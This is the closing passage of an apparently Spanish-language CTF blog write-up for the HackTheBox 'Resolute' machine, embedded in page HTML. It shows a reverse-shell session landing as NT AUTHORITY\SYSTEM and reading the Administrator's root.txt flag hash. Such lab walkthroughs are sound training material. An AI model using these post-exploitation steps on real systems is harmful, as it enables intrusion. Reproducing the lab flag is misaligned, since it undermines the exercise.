+connect to <span class="o">[</span>10.10.14.222] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.155] 52275
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+56b547be1d0d3bd3405a6e44e23e164b
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/08/resolute.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolucion de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
